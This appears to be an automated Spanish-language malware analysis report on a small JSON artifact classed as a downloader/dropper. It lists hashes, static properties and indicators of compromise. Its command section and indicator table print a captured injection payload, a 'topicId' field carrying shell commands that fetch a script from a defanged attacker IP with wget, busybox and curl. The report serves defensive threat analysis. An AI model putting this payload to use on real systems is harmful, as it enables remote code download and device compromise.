# 🧬 Payload Analysis

`1ef69e5662a65b7951943130fb8b12c216b9358c8fbec01a40aef3d42e22d6f9`

## 📌 Resumen

Artefacto identificado como JSON text data de 196 B. La evidencia estática disponible identifica capacidad de descarga remota. La referencia remota apunta al recurso `wget.sh` en `hxxp://91.92.40.XXX/wget.sh`. Se observaron o extrajeron 1 comandos relacionados con el artefacto.


## 🏷️ Clasificación

- **Categoría:** `Downloader / Dropper`
- **Confianza:** `Baja`
- **Riesgo:** `Medium`

## 🗓️ Registro

- **Registrado:** `2026-08-09T19:51:31.000000Z`
- **Tipo de registro:** `snapshot inmutable`

## 🔐 Identidad

- **SHA256:** `1ef69e5662a65b7951943130fb8b12c216b9358c8fbec01a40aef3d42e22d6f9`
- **SHA1:** `57a81e51e22d66f6d331defb07141ea3ee4525a7`
- **MD5:** `0c4fe01b314819213cfcc0fc57efeb1b`

## 🧪 Análisis estático

| Propiedad | Resultado |
| --- | --- |
| Descripción | JSON text data |
| Tamaño | 196 B |
| Entropía | 4.8 |
| Strings | 1 |

## 🧠 Comportamiento observado

1. **Descarga remota**
2. **Ejecución**
3. **Limpieza**

## 🔬 Evidencia de clasificación

- Capacidad detectada: Descarga remota
- Motivos técnicos: mime=JSON text data; iocs=5

## 🖥️ Comandos observados / extraídos

```text
{"topicId":"cd /tmp;rm -f .s;wget hxxp://91.92.40.XXX/wget.sh -O .s;busybox wget hxxp://91.92.40.XXX/wget.sh -O .s;curl
```

## 🌐 Indicadores

| Tipo | Valor | Contexto |
| --- | --- | --- |
| url | hxxp://91.92.40.XXX/wget.sh | strings |
| url | hxxp://91.92.40.XXX/wget.sh;chmod | strings |
| ip | 91.92.40.XXX | static_analysis |
| command | {"topicId":"cd /tmp;rm -f .s;wget hxxp://91.92.40.XXX/wget.sh -O .s;busybox wget hxxp://91.92.40.XXX/wget.sh -O .s;curl | strings |
| hash | 1ef69e5662a65b7951943130fb8b12c216b9358c8fbec01a40aef3d42e22d6f9 | static_analysis |
| ip | 45.153.34.XXX | artifact_source |

## 🔎 Triage

| Campo | Valor |
| --- | --- |
| Categoría | structured text |

## 🛡️ Nota de publicación

Este informe conserva una **fotografía del estado de análisis en la fecha de registro**. No se mantienen campos temporales de observación ni contadores vivos.

Las IPv4 públicas se anonimizaron como `A.B.C.XXX`; las direcciones internas, credenciales, tokens y otros secretos se redactan antes de publicar.
